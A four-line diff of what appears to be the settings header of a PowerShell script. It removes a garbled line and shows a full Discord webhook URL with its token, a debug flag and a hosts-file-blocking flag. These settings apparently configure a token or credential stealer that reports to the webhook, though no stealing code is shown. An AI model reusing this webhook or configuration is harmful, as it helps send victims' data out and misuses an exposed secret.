@@ -1,4 +1,4 @@
-zw(uçB¢i
+
 $webhook =  "https://discord.com/api/webhooks/1282681333075804284/D19BPj8V0QG9LhX49o6xYb099HAGzaVvczyUHfxoJEgDw1cH6TyKZbEUnYLEQmgiWnnA"
 $debug = $true
 $blockhostsfile = $true
